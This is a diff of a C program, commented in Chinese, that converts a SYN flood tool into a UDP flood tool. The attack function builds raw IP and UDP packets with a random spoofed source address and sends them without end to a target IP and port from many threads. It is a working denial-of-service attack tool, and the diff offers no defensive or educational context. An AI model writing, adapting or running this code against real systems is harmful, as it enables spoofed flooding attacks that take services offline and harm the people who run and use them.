@@ -24,28 +24,22 @@ static int alive = -1;
 char dst_ip[20] = { 0 };
 int dst_port;
 
-/* mode */
-char mode;
 
-/* 發送SYN包函数
- * 填寫IP頭部，TCP頭部
- * TCP偽頭部僅用於校驗和的计算
- */
 void* attack(void *addr_info){
-        struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
+    struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
 	char buf[100], sendbuf[100];
 	int len;
 	struct iphdr ip_hdr;			//IP頭部
-	struct tcphdr tcp_hdr;		//TCP頭部
-	struct pseudohdr pseudoheader;	//TCP偽頭部
+	struct udphdr udp_hdr;		//UDP頭部
+	struct pseudohdr pseudoheader;	//UDP偽頭部
 
 
-	len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+	len = sizeof(struct iphdr) + sizeof(struct udphdr);
 	
 	/* 初始化頭部 */
-	init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port, mode);
+	udp_init_header(&ip_hdr, &udp_hdr, &pseudoheader, dst_ip, dst_port);
 	
-	/* 處於活動狀態時持續發送SYN包 */
+	/* 處於活動狀態時持續發送包 */
 	while(alive){
 		ip_hdr.saddr = rand();
 
@@ -56,15 +50,15 @@ void* attack(void *addr_info){
 
 		pseudoheader.saddr = ip_hdr.saddr;
 
-		//計算TCP校驗和
+		//計算UDP校驗和
 		bzero(buf, sizeof(buf));
 		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
-		memcpy(buf+sizeof(pseudoheader), &tcp_hdr, sizeof(struct tcphdr));
-		tcp_hdr.th_sum = check_sum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));
+		memcpy(buf+sizeof(pseudoheader), &udp_hdr, sizeof(struct udphdr));
+		udp_hdr.uh_sum = check_sum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct udphdr));
 
 		bzero(sendbuf, sizeof(sendbuf));
 		memcpy(sendbuf, &ip_hdr, sizeof(struct iphdr));
-		memcpy(sendbuf+sizeof(struct iphdr), &tcp_hdr, sizeof(struct tcphdr));
+		memcpy(sendbuf+sizeof(struct iphdr), &udp_hdr, sizeof(struct udphdr));
 		printf(".");
 		if (sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))< 0){
 			perror("sendto()");
@@ -89,14 +83,13 @@ int main(int argc, char *argv[]){
 	pthread_t pthread[MAXCHILD];
 	int err = -1;
 
-	mode = (char)*argv[3];
 	alive = 1;
 	/* 截取信號CTRL+C */
 	signal(SIGINT, sig_int);
 
 	/* 参數是否數量正鴂 */
-	if(argc < 4 || argc > 4){
-		printf("usage: syn <IPaddress> <Port> <mode>\n");
+	if(argc < 3 || argc > 3){
+		printf("usage: udp <IPaddress> <Port>\n");
 		exit(1);
 	}
 
@@ -129,7 +122,7 @@ int main(int argc, char *argv[]){
 	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));
 
 	/* 建立原始socket */
-	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);	
+	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_UDP);	
 	if (sockfd < 0){
 		perror("socket()");
 		exit(1);
